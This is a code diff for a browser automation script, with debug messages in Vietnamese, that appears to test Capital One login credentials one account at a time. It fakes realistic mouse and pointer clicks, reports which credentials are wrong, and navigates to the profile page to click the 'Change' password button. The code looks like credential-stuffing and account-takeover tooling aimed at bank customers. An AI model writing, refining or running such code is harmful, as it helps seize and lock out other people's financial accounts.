@@ -84,11 +84,19 @@
         if (!element) return false;
         try {
             element.focus();
-            const clickEvent = new MouseEvent('click', {
-                bubbles: true,
-                cancelable: true
-            });
+            const rect = element.getBoundingClientRect();
+            const cx = rect.left + rect.width / 2;
+            const cy = rect.top + rect.height / 2;
+            const opts = { bubbles: true, cancelable: true, view: window, clientX: cx, clientY: cy };
+
+            element.dispatchEvent(new PointerEvent('pointerdown', opts));
+            element.dispatchEvent(new MouseEvent('mousedown', opts));
+            element.dispatchEvent(new MouseEvent('mouseup', opts));
+            element.dispatchEvent(new PointerEvent('pointerup', opts));
+
+            const clickEvent = new MouseEvent('click', opts);
             element.dispatchEvent(clickEvent);
+
             if (typeof element.click === 'function') {
                 element.click();
             }
@@ -253,13 +261,22 @@
                                  (bodyText.includes("invalid") && bodyText.includes("password")));
 
         if (isAutoCheck && isWrongCredsText) {
-            window._wrongCredsCount = (window._wrongCredsCount || 0) + 1;
-            if (window._wrongCredsCount >= 10) {
-                clearInterval(interval);
-                reportResult(acc, 'error', 'Sai tai khoan hoac mat khau Capital One');
-                return;
+            const hasClickedEnough = window._signInClickCount >= 3;
+            const timeSinceLastClick = window._lastSignInTime ? (Date.now() - window._lastSignInTime) : 0;
+            const hasWaitedEnough = timeSinceLastClick > 10000; // Đợi ít nhất 10 giây sau lần click cuối cùng
+
+            if (hasClickedEnough && hasWaitedEnough) {
+                window._wrongCredsCount = (window._wrongCredsCount || 0) + 1;
+                if (window._wrongCredsCount >= 4) { // Xác nhận thêm 4 lần (6 giây) sau khi đã đủ điều kiện
+                    clearInterval(interval);
+                    reportResult(acc, 'error', 'Sai tai khoan hoac mat khau Capital One');
+                    return;
+                } else {
+                    setDebug(`Phat hien loi mat khau, dang xac nhan cuoi cung... (${window._wrongCredsCount}/4)`, '#eab308');
+                }
             } else {
-                setDebug(`Phat hien thong bao loi mat khau (lan ${window._wrongCredsCount}/10), dang cho them de xac nhan...`, '#eab308');
+                setDebug(`Phat hien loi mat khau, dang doi load hoac doi click tiep...`, '#eab308');
+                window._wrongCredsCount = 0; // Reset nếu chưa đủ điều kiện
             }
         } else {
             window._wrongCredsCount = 0;
@@ -369,20 +386,15 @@
                 return;
             }
 
-            const changeBtn = Array.from(document.querySelectorAll('button, a, span')).find(btn => {
-                if (btn.offsetWidth === 0 || btn.offsetHeight === 0) return false;
+            const changeBtn = Array.from(document.querySelectorAll('button')).find(btn => {
                 const txt = (btn.textContent || '').trim().toLowerCase();
-                if (txt === 'change' || txt === 'change password') return true;
-                if (btn.className && typeof btn.className === 'string' && btn.className.includes('secondary-btn') && txt.includes('change')) return true;
-                return false;
+                return txt === 'change' || (btn.classList.contains('secondary-btn-large') && txt.includes('change')) || (btn.className && typeof btn.className === 'string' && btn.className.includes('secondary-btn') && txt.includes('change'));
             });
 
             if (changeBtn && changeBtn.offsetWidth > 0) {
                 setDebug('🖱️ Click [Change] mat khau...', '#0284c7');
                 safeClick(changeBtn);
                 return;
-            } else {
-                setDebug('Dang o Profile, cho nut Change hoac form xuat hien...', '#eab308');
             }
             return;
         }
